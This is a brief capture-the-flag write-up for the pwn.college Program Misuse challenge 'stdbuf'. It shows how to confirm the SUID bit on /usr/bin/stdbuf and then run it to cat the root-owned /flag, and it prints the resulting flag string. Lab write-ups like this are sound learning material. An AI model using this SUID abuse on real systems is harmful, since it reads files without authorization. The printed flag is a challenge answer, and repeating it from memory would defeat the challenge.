---
layout: page
title: "Challenge Name: stdbuf"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/stdbuf`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/stdbuf
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/stdbuf
```

-The `s` in `-rws` indicates it's a SUID binary.
-`stdbuf` runs with **root privileges**.

## 🚀 Exploitation

The `stdbuf`  command in Linux is used to control buffering behavior of standard input (stdin), output (stdout), and error (stderr) for another command.

```bash
stdbuf -o0 cat /flag
```

Output:
```
pwn.college{0yrk_SqiqllhJjs5dX0aI_peczm.dJTNxwSM0IzMyEzW}
```

      
